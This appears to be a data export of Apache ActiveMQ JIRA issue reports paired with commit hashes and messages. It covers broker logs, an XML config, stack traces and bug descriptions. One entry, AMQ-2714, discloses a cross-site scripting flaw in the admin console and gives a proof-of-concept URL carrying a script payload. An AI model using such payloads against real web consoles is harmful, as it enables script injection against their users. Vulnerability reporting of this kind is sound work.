2010-08-31 15:45:10,970 | INFO  | Slow KahaDB access: cleanup took 1047 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker
2010-08-31 15:45:11,829 | INFO  | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | WrapperSimpleAppMain
2010-08-31 15:45:12,235 | INFO  | Initializing Spring FrameworkServlet 'dispatcher' | /admin | WrapperSimpleAppMain
2010-08-31 15:45:12,719 | INFO  | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 15:45:13,422 | INFO  | Initializing Spring root WebApplicationContext | /camel | WrapperSimpleAppMain
2010-08-31 15:45:16,390 | INFO  | Connector vm://localhost Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain
2010-08-31 15:45:18,468 | INFO  | Camel Console at http://0.0.0.0:8161/camel | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 15:45:18,561 | INFO  | ActiveMQ Web Demos at http://0.0.0.0:8161/demo | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 15:45:18,624 | INFO  | RESTful file access application at http://0.0.0.0:8161/fileserver | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 15:45:18,686 | INFO  | Started SelectChannelConnector@0.0.0.0:8161 | org.eclipse.jetty.util.log | WrapperSimpleAppMain

Here is the config:

    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""localhost"" dataDirectory=""${activemq.base}/data"" persistent=""true"" systemExitOnShutdown=""true"" useShutdownHook=""false"" advisorySupport=""false"" useJmx=""true"">
 
        <!--
			For better performances use VM cursor and small memory limit.
			For more information, see:
            
            http://activemq.apache.org/message-cursors.html
            
            Also, if your producer is ""hanging"", it's probably due to producer flow control.
            For more information, see:
            http://activemq.apache.org/producer-flow-control.html
        -->
              
        <destinationPolicy>
            <policyMap>
              <policyEntries>
                <policyEntry topic="">"" producerFlowControl=""false"" optimizedDispatch=""true"" memoryLimit=""128mb"">
                  <pendingSubscriberPolicy>
                    <fileCursor />
                  </pendingSubscriberPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""false"" optimizedDispatch=""true"" memoryLimit=""128mb"">
                  <!-- Use VM cursor for better latency
                       For more information, see:
                       
                       http://activemq.apache.org/message-cursors.html
                   -->    
                  <pendingQueuePolicy>
                    <fileQueueCursor/>
                  </pendingQueuePolicy>
                  
                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy> 
 
        
        <!-- 
            The managementContext is used to configure how ActiveMQ is exposed in 
            JMX. By default, ActiveMQ uses the MBean server that is started by 
            the JVM. For more information, see: 
            
            http://activemq.apache.org/jmx.html 
        -->
        <managementContext>
            <managementContext createConnector=""true""/>
        </managementContext>

        <!-- 
            Configure message persistence for the broker. The default persistence
            mechanism is the KahaDB store (identified by the kahaDB tag). 
            For more information, see: 
            
            http://activemq.apache.org/persistence.html 
        -->
        <persistenceAdapter>
            <kahaDB directory=""${activemq.base}/data/kahadb"" enableIndexWriteAsync=""true"" journalMaxFileLength=""64mb""  indexWriteBatchSize=""10000"" indexCacheSize=""10000""/>
        </persistenceAdapter>
        
        
          <!--
            The systemUsage controls the maximum amount of space the broker will 
            use before slowing down producers. For more information, see:
            
            http://activemq.apache.org/producer-flow-control.html
             
        <systemUsage>
            <systemUsage>
                <memoryUsage>
                    <memoryUsage limit=""600 mb""/>
                </memoryUsage>
                <storeUsage>
                    <storeUsage limit=""10 gb""/>
                </storeUsage>
                <tempUsage>
                    <tempUsage limit=""1 gb""/>
                </tempUsage>
            </systemUsage>
        </systemUsage>
		-->
		  
        <!-- 
            The transport connectors expose ActiveMQ over a given protocol to
            clients and other brokers. For more information, see: 
            
            http://activemq.apache.org/configuring-transports.html 
        -->
        <transportConnectors>
            <transportConnector name=""nio"" uri=""nio://0.0.0.0:61616""/>
        </transportConnectors>


    </broker>

",db5ba04cd2c9c60a794ef356db3ff913ca98cb06,"https://issues.apache.org/activemq/browse/AMQ-2891 - add some progress info messages for cursor recovery, kicks in a 50000 messages

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@992241 13f79535-47bb-0310-9956-ffa450edef68"
12483448,AMQ-2882,"The following exception is seen after creating and starting a new broker instance.  I believe the conf/jetty-real.properties file should be among the files copied from the $ACTIVEMQ_HOME/conf directory to the instance's conf directory.  A patch is attached.

java.io.FileNotFoundException: /home/phil/untouchedAMQ/apache-activemq-5.4.0/BadBroker/conf/jetty-realm.properties (No such file or directory)
	at java.io.FileInputStream.open(Native Method)
	at java.io.FileInputStream.<init>(FileInputStream.java:106)
	at org.eclipse.jetty.util.resource.FileResource.getInputStream(FileResource.java:274)
	at org.eclipse.jetty.security.HashLoginService.loadUsers(HashLoginService.java:145)
	at org.eclipse.jetty.security.MappedLoginService.doStart(MappedLoginService.java:115)
	at org.eclipse.jetty.security.HashLoginService.doStart(HashLoginService.java:186)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.security.SecurityHandler.doStart(SecurityHandler.java:316)
	at org.eclipse.jetty.security.ConstraintSecurityHandler.doStart(ConstraintSecurityHandler.java:231)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:137)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:83)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
",4afb2028a2bc6c1c06532e8e7d03df6254356e60,"https://issues.apache.org/activemq/browse/AMQ-2882 - copy jetty-realm.properties with create command

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@990793 13f79535-47bb-0310-9956-ffa450edef68"
12483508,AMQ-2880,"In cases where JDBC persistence is used and the database server is under a fair bit of load it's sometimes possible for table/row locks to time out, which means you'll see exceptions such as:

java.sql.BatchUpdateException: Lock wait timeout exceeded; try restarting transaction
at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:1693)
at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1108)
at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)
at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)
at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:98)
at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:80)
at org.apache.activemq.store.jdbc.TransactionContext.commit(TransactionContext.java:161)
at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitTransaction(JDBCPersistenceAdapter.java:504)
at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:109)
at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:220)
at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:73)
at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:176)
at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:430)
at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102)
at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217)
at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)
at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
at java.lang.Thread.run(Thread.java:636)

In this case the connection to the database is fine and what we should do is retry the transaction as it's a temporary failure condition.  Instead what happens is the broker moves to the next message in the queue, leaving the current message in the database.  The message won't show up in the web console and cannot be consumed by any consumers until the broker is restarted.

Attached is a test case that simulates the error condition in a controlled fashion by using a subclassed JDBCPersistenceAdapter that will throw an exception in commitTransaction as necessary.  So the producer sends 10 messages and then the consumer tries to consume them, during this time the persistence adapter will throw an exception during commitTransaction.  Then the condition is cleared and the consumer can consume all 10 messages, however the consumer only consumes 9 messages, the 1st message in the sequence is still in the database.  Hopefully the logging makes this clear.",0cc5fd3652a9b59f5fafc46b25ebaddf86441435,"add missing class for:  https://issues.apache.org/activemq/browse/AMQ-2880 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995786 13f79535-47bb-0310-9956-ffa450edef68"
12482179,AMQ-2868,"Test fails trying to consume all messages and misses one message on occasion.
Problem, concurrent transaction completion leaves messages out of order in the cursor w.r.t to the store. When the cursor is exhausted, the cache memory limit is reached and subsequent messages are not cached so the next message needs to be recovered from the store, the point at which we start reading from the store is important. If, at the point at which the cache is full, the cursor is out of order, it can skip a message in the store.
Previously, the entire store was replayed, as if it was never cached and these messages are suppressed by the cursor as duplicates, but there is a size limit and producers spread limit on the duplicate suppression that means messages can avoid duplicate detection. Also, in the case of consumer transactions that rollback, duplicate delivery is required so out of order messages may arrive on a subsequent dispatch.
setBatch, ensuring that messages are replayed form the correct point in the store is important to give ordering guarantees with failover and memory limits, so synchronization of the store and cursor w.r.t concurrent transactions is also needed in support of setBatch.

Store commit and the after completions that update the cursor need to be serialized for a destination to keep make this totally deterministic.
recap, memory limits such that a cache will be filled, concurrent send transaction completion so that store updates and cursor updated can overlap with each other and with cache invalidation. setBatch trying to reduce the replay of messages.

Outstanding question:
- do we make the use of setBatch and transaction sync with store and cursor configurable. If setBatch is off, don't sync. Then at the mercy of consumer transactions and duplicate suppression in the event of failover. An alternative is to make the sync conditional on the use of the cache for a destination. Very reliable but slow; slow is a very relative determination!
Also, may need to be disabled for all destinations as a transaction can span many destinations.",395bf82f80a5b8ba7adbd1d5dcdc0c3db8d34363,"https://issues.apache.org/jira/browse/AMQ-2868 - fix issue with blocked transaction completion in highly concurrent systems. It was possible to miss an after completion callback

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1207693 13f79535-47bb-0310-9956-ffa450edef68"
12481867,AMQ-2861,<NA>,6dffe4debefd29dfbe58c8d3bd64782bcaf25b1e,"https://issues.apache.org/activemq/browse/AMQ-2861 - composite destinations and cursor memory usage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@982317 13f79535-47bb-0310-9956-ffa450edef68"
12483505,AMQ-2827,"Was able to successfully send 20 messages to AMQ via REST.  I can see that the messages were consumed and there are 20 messages in the response queue.  However, when reading the response queue using selector via REST, it intermittently returns HTTP code 204.  By looking at the ""Active Consumers"" for the response queue, I can see that the specific message has been dispatched to the consumer as the ""Enqueues"", ""Dequeues"" and ""Dispatched"" values are set to 1.

The server has been configured with consumer.prefetchSize=1.

I've further tried reproducing the problem by setting consumer.prefetchSize=0.  When I get a 204 response, I can see that the message is in the outgoing queue.  But executing another GET with the same Correlation ID will hang the client even though readTimeout is set.

This has been tested with 5.4-SNAPSHOT 15-July.

Update 23 July:

Tried using the following settings:

- removed consumer.prefetchSize in web.xml
- saved session cookie for requests
- used the ""selector"" HTTP header
- used a random value for clientId in each request

It seems to be returning all messages in properly.  However, each request generates a new client session based on the selector header.

",f772e5f8c7edb9b3d3fd895304bdf35ca251d103,"https://issues.apache.org/activemq/browse/AMQ-2827 - test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@994978 13f79535-47bb-0310-9956-ffa450edef68"
12482812,AMQ-2817,"Currently STOMP on a SEND extracts out the JMS headers and put the rest of the headers into the message properties.  If a STOMP consumer starts to consume the messages, the JMS fields are put into the header and the the properties are put in.  This can lead to a situation where if the client has provided a header that it shouldn't have (e.g. message-id) it overwrites the one provided by the broker.

This can lead to problems with e.g. ACKs where the wrong message-id is sent back.

This patch sanitizes all headers for a MESSAGE frame when they come into the broker so they never get set in the properties.",03349fecda8efde730b100ed338c0cfe2171d462,"https://issues.apache.org/activemq/browse/AMQ-2817 - prevent test from failing

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@963678 13f79535-47bb-0310-9956-ffa450edef68"
12482899,AMQ-2801,"The attached test case demonstrates the following scenario.  

-       Start all durable subscriber connections (on Separate JVMs) each with different selectors.
-       Publish messages to ActiveMQ that only matches one of selectors.
-       Close the connection to both subscribers and restart both connections.
-       The other durable subscriber pending queue size is displayed with the enqeue count for the subscriber on the activemq console.",3a181501b1814beb758b1feea690cb9062dc2b62,"test for: https://issues.apache.org/jira/browse/AMQ-2801

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1154258 13f79535-47bb-0310-9956-ffa450edef68"
12482969,AMQ-2782,<NA>,97032199728567b0ea70f33c0bfedd96e420b0ac,"https://issues.apache.org/activemq/browse/AMQ-2782 - test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@955505 13f79535-47bb-0310-9956-ffa450edef68"
12483116,AMQ-2770,"active() and connectionId() shows incorrect activity states on Durable subscription MBeans. I cannot see if the subscription is online or offline.

Please check my test case.",370d56e300baf17606af93a27f4a2fbb4c6c3335,"https://issues.apache.org/activemq/browse/AMQ-2770 - durable subscription mbean

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@954893 13f79535-47bb-0310-9956-ffa450edef68"
12483262,AMQ-2751,see test case. calling recover form message listener with redelivery delay will result in auto ack of duplicate message so it disappears in error.,18adfefabef7fb6dc7dafcdf86cb59b54b7750a1,"resolve https://issues.apache.org/activemq/browse/AMQ-2751 - duplicate suppression over eager with listener, session.recover from a message listener when default delayed redelivery is in place

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@948463 13f79535-47bb-0310-9956-ffa450edef68"
12483282,AMQ-2732,Currently we don't check whether storing a file on the server succeeds or not.,a34c80858e17ad8e2b627b33836514ad651a8c6f,"https://issues.apache.org/activemq/browse/AMQ-2732 - ftp blob permission denied

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@943915 13f79535-47bb-0310-9956-ffa450edef68"
12482895,AMQ-2728,"There is a change in how continuations work in Jetty 7 (over previously used Jetty 6), so appropriate servlets must be refactored.",21b81e180f831724f0969edbfdb03e76cb238551,"https://issues.apache.org/activemq/browse/AMQ-2728 - cleaning up MessageServlet

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@943466 13f79535-47bb-0310-9956-ffa450edef68"
12483420,AMQ-2714,"Cross-Site Scripting Vulnerability exists in Apache ActiveMQ.
Example:  http://localhost:8161/admin/queueBrowse/example.A?view=rss&feedType=<script>alert(""ACTIVEMQ"")</script>

Tested on 5.3.1 and 5.3.0 versions.
",6d5c4267fe32d49cdff44e729fa0f03665ca7e59,"https://issues.apache.org/activemq/browse/AMQ-2714 - custom 404 and exception pages

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@938417 13f79535-47bb-0310-9956-ffa450edef68"
12483290,AMQ-2681,"field findMessageByIdStatement in org.apache.activemq.store.jdbc.Statements.java is never used and getFindMessageByIdStatement is using findMessageStatement which causes problem. Because if someone overwrite the default findMessageStatement, it will cause doGetMessageById to fail.",3336a22ff9ac1175d3bd688ef3438f5bb5ec964c,"https://issues.apache.org/activemq/browse/AMQ-2681 - adding license header

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@930212 13f79535-47bb-0310-9956-ffa450edef68"
12483181,AMQ-2670,"When deploying the rar under JBoss, the connectionfactory bound in de JNDI tree is always of type 'ActiveMQConnectionFactory'., while it should be ActiveMQXAConnectionFactory (which implements XAConnectionFactory).

I attached a new class that creates the correct type of factory, and this can be configured in the ra.xml (also attached).
",aef23f94f35c180fc4165d9335f0a579253bb3e8,"resolve https://issues.apache.org/activemq/browse/AMQ-2670 - apply patch with thanks. Now possible to integrate RAR XAResource with jboss via the jboss org.jboss.jms.server.recovery.MessagingXAResourceRecovery handler

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@927520 13f79535-47bb-0310-9956-ffa450edef68"
12483151,AMQ-2665,"If the keepDurableSubsActive=true in the broker and there are pre-created topics (at startup) in the config xml, then every subscription re-activation increases the consumers list.
",9c47f6b38548d089fe05a63ed37d9ca81fc91376,"https://issues.apache.org/activemq/browse/AMQ-2665 - durable activation and predefined topics

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@952976 13f79535-47bb-0310-9956-ffa450edef68"
12483186,AMQ-2630,"The Oracle AQjmsDestination Object implements all the interfaces:

AQjmsDestination
 <-Queue<-Destination
 <-TemporaryQueue<-Queue<-Destination
 <-TemporaryTopicTopic<-Destination
 <-Topic<-Destination

The function ActiveMQDestination.transform fails to indicate the type of the Destination Object right, because it implements all Interfaces.

When the Object its a Topic in reality, the

        if (dest instanceof TemporaryQueue) {
            return new ActiveMQTempQueue(((TemporaryQueue)dest).getQueueName());
        }

thinks its a TemporaryQueue.

This causes the following stacktrace:
java.lang.NullPointerException
	at org.apache.activemq.command.ActiveMQDestination.setPhysicalName(ActiveMQDestination.java:208)
	at org.apache.activemq.command.ActiveMQTempDestination.setPhysicalName(ActiveMQTempDestination.java:63)
	at org.apache.activemq.command.ActiveMQDestination.<init>(ActiveMQDestination.java:77)
	at org.apache.activemq.command.ActiveMQTempDestination.<init>(ActiveMQTempDestination.java:39)
	at org.apache.activemq.command.ActiveMQTempQueue.<init>(ActiveMQTempQueue.java:35)
	at org.apache.activemq.command.ActiveMQDestination.transform(ActiveMQDestination.java:121)
	at org.apache.activemq.command.ActiveMQMessage.setJMSDestination(ActiveMQMessage.java:222)
	at org.apache.activemq.network.jms.TopicBridge.sendMessage(TopicBridge.java:91)
	at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:146)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1088)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:127)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:197)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


 
",f33e2190d0c481b78171749091d3d044f139e85d,"resolve https://issues.apache.org/activemq/browse/AMQ-2630 - added test and restricted imlementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@918381 13f79535-47bb-0310-9956-ffa450edef68"
12483504,AMQ-2622,"I have outlined the problem in the following forum link: 

http://old.nabble.com/URGENT-QUESTION:-AMQ-5.3.0-bug-or-configuration-error------ObjectMessage-is--still--being-serialized-when-using-setObjectMessageSerializationDefered-and-setCopyMessageOnSend-td27654579.html

I have not created a JUnit test that demonstrates this, but here are the basic steps to reproduce this:
* create an embedded broker with no persistence, dedicatedTaskRunner = false, and optimizedDispatch = true
* create the ActiveMQConnectionFactory and set the setObjectMessageSerializationDefered = TRUE and setCopyMessageOnSend = FALSE
* create your connection from the factory
* create a producer and [MessageListener] consumer against a Queue
* create your own custom java object that implements Externalizable - this is important, because you will be able to set a breakpoint in the readExternal and writeExternal methods to see the 2 locations on the AMQ code where the message is copied - causing a serialization/de-serialization
* create a new ObjectMessage and send it from the producer to the consumer

The message will get serialized in ActiveMQConnection.java on this line [msg = msg.copy();] - see the linked forum issue for the code snippet and line numbers. 

NOTE: you will need to continue stepping the code through the complete dispatch process because it will go through a de-serialization phase as well when the call to getObject is called in the onMessage of the MessageListener.

Please let me know if I can provide any more details - OR, if I'm not setting something properly to keep the ObjectMessage from being serialized.

Thanks,
Bob",ff006954d811ccaa84b8f94a77168aaaa7d73898,"add additional test class : https://issues.apache.org/activemq/browse/AMQ-2622

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@927066 13f79535-47bb-0310-9956-ffa450edef68"
12483832,AMQ-2584,"Hi,

i am using activemq 5.3 (resp. 5.4 snapshot , 5.3.1 snapshot) with kahadb in following use-case:
- 3 durable topic subscriber, each refuses message using session.recover(), 1 delivery attempts
- ActiveMQ.DLQ consumer
- persistent message topic producer

In such case deadletter consumer should consume every message sent, as soon as number of delivery attempts is reached and mmessage is sent to ActiveMQ.DLQ. Result is ok but kahadb data directory at the end contains all log files with names db-<number>.log ever created. They aren't deleted even after some time.

I can also see following massege in console:

WARN | Duplicate message add attempt rejected. Message id: ID:sk1d069c-3826-1264006781626
-0:0:1:1:13425

If use-case is altered to use queue instead of topic log files are periodically deleted without WARN messages in console.

Same behaviour (data files not cleaned) if amqPersistenceAdapter is used except of WARN messages.


",815c2f32bce321aeaa94f0d2a5a1fa0137814562,"resolve https://issues.apache.org/activemq/browse/AMQ-2584 for kahaDB, AMQ store still needs work, seems to be a different issue

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@986651 13f79535-47bb-0310-9956-ffa450edef68"
12483832,AMQ-2584,"Hi,

i am using activemq 5.3 (resp. 5.4 snapshot , 5.3.1 snapshot) with kahadb in following use-case:
- 3 durable topic subscriber, each refuses message using session.recover(), 1 delivery attempts
- ActiveMQ.DLQ consumer
- persistent message topic producer

In such case deadletter consumer should consume every message sent, as soon as number of delivery attempts is reached and mmessage is sent to ActiveMQ.DLQ. Result is ok but kahadb data directory at the end contains all log files with names db-<number>.log ever created. They aren't deleted even after some time.

I can also see following massege in console:

WARN | Duplicate message add attempt rejected. Message id: ID:sk1d069c-3826-1264006781626
-0:0:1:1:13425

If use-case is altered to use queue instead of topic log files are periodically deleted without WARN messages in console.

Same behaviour (data files not cleaned) if amqPersistenceAdapter is used except of WARN messages.


",c290a17460fb61ba97a71e149cb9da2ad80cc0f9,"add test variant that demonstrates the need to disable the audit on the dlq when there is a concurrent consumer with multiple durable subs, some duplicate sends will not be caught (if they are acked in the mean time) so that audit stop needs to be disabled such that they can be consumed. This points to the need for a dlq per durable sub. work around for: https://issues.apache.org/activemq/browse/AMQ-2584

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1027886 13f79535-47bb-0310-9956-ffa450edef68"
12483233,AMQ-2571,"Please see this post for discussion:
http://old.nabble.com/Problems-with-prefetch-and-TemporaryQueues-td27130529.html

I've tested this on 4.1.1, and briefly on 5.3.0 with the same result.

Scenario:
We have a server and a client. The client posts a message on the servers queue in order to subscribe to updates.
The server takes the reply address from the client and starts sending messages to a TempQueue created by the client.

When the client disconnects without notifying the server the following might happen:
1. The temporary queue is removed correctly when the client exits and closes its connection.

From here we have three scenarios:
2.a The server gets an exception the next time it tries to send a message to the TempQueue. This is wanted behaviour. It can then simply drop the ""subscription"".

2.b The server isn't notified in time and sends some messages before it gets the exception. Due to AutoCreateDestination being enabled one of these messages creates a new TempQueue with the same name as the one removed. It is of course missing a consumer.
But since the server gets the exception it will stop posting to the TempQueue. However, when the server closes its connection the TempQueue is not removed and is left lying around with no consumer.

2.c The server recreates the TempQueue in the same way as in 2.b, but here it never gets the exception for some reason. The server then has no idea that the client left and keeps pilling up messages on the TempQueue until the broker object hits its memory limit and everything connected to the broker halts.


I think there are three problems here:
1. The exception is not thrown every time.
2. When the TempQueue is recreated it is not removed when the server closes its connection. Also, the server gets an InvalidDestinationException if I, at server side, try to connect a consumer to the TempQueue. I guess this means that although the server is the initiator for the auto(re)creation it does not become the owner of the TempQueue. But who is then the owner? The broker itself?

3. Due to AutoCreateDestination being enabled by default for TempQueues, every post to a TempQueue could result in unknowingly creating a new TempQueue.


Suggestions
Setting AutoCreateDestination to false for TempQueues solves all three problems.
So exposing that option in an easily accessible way is important.

But even then, 1 and 2 should perhaps be examined separately.

I'll attach a JUnit test case for this. Unfortunately it is not 100% reliable in detecting the problem. One has to run it multiple times.
On my test setup it failed correctly 8 times out of 10 runs. You might be able to improve it.

Best Regards
Nimos",e166ae3937a60e2d5d576ff86db45f12c42a0308,"Added test case for http://issues.apache.org/activemq/browse/AMQ-2571

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@901832 13f79535-47bb-0310-9956-ffa450edef68"
12483264,AMQ-2568,"See also this thread: http://mail-archives.apache.org/mod_mbox/activemq-users/201001.mbox/%3C4E50CAAD-0600-46FB-B5D0-B623C21A362D@gmail.com%3E

See also this bug: http://issues.apache.org/activemq/browse/AMQ-1214

========================

we have a 5.3.0 embedded broker that refuses to shutdown cleanly because of lingering threads. A long time (dozens of seconds) after broker stop() is called,  these threads are still active:

* [ActiveMQ Scheduler] (Daemon) Group: main
* [Timer-0] (Daemon) Group: main

We discovered that [ActiveMQ Scheduler] can be closed adding this snippet to our code:

Scheduler scheduler = Scheduler.getInstance();
scheduler.shutdown();

After doing this the other lingering thread -- ""[Timer-0]"" -- did not go away, but at least we discovered that this timer is JMX related: if we disable JMX connector the timer disappear.",630184adfa669df839aa627ef4631453be2be35d,"test case for https://issues.apache.org/activemq/browse/AMQ-2568

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@899640 13f79535-47bb-0310-9956-ffa450edef68"
12483264,AMQ-2568,"See also this thread: http://mail-archives.apache.org/mod_mbox/activemq-users/201001.mbox/%3C4E50CAAD-0600-46FB-B5D0-B623C21A362D@gmail.com%3E

See also this bug: http://issues.apache.org/activemq/browse/AMQ-1214

========================

we have a 5.3.0 embedded broker that refuses to shutdown cleanly because of lingering threads. A long time (dozens of seconds) after broker stop() is called,  these threads are still active:

* [ActiveMQ Scheduler] (Daemon) Group: main
* [Timer-0] (Daemon) Group: main

We discovered that [ActiveMQ Scheduler] can be closed adding this snippet to our code:

Scheduler scheduler = Scheduler.getInstance();
scheduler.shutdown();

After doing this the other lingering thread -- ""[Timer-0]"" -- did not go away, but at least we discovered that this timer is JMX related: if we disable JMX connector the timer disappear.",35593638f5d45f7ba5a76d4431afe725563f633e,"resolve ConnectorXBeanConfigTest, broker service needs to null more impls at shutdown to allow restart to find new impls of scheudaler etc. consequence of fixes for https://issues.apache.org/activemq/browse/AMQ-2620  and
https://issues.apache.org/activemq/browse/AMQ-2568

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@947671 13f79535-47bb-0310-9956-ffa450edef68"
